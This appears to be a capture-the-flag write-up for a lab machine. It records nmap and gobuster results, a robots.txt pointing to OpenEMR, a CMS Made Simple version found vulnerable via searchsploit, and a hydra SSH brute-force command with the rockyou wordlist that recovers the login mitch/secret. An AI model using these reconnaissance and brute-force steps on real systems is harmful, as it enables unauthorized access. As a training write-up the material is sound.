# 10.10.208.10
Nothing interesting in the source code of landing page

# nmap
```
21 - ftp
80 - http
2222 - ssh
```

# gobuster

```
/index.html
/robots.txt
/simple
```

# /robots.txt
```
Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```
/openemr-5_0_1_3 won't open

# /simple
```
This site is powered by CMS Made Simple version 2.2.8
```

# searchsploit

```
Exploit Title

CMS Made Simple < 2.2.10 - SQL Injection 
```
Python2 is no longer supported, so I had to tweak it a little bit, but using python code provided by searchsploit we get:
```
Well, we got nothing. After 10 minutes of debugging hashlib errors I gave up and used hydra.
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.208.10:2222
[...] 
[2222][ssh] host: 10.10.208.10   login: mitch   password: secret
```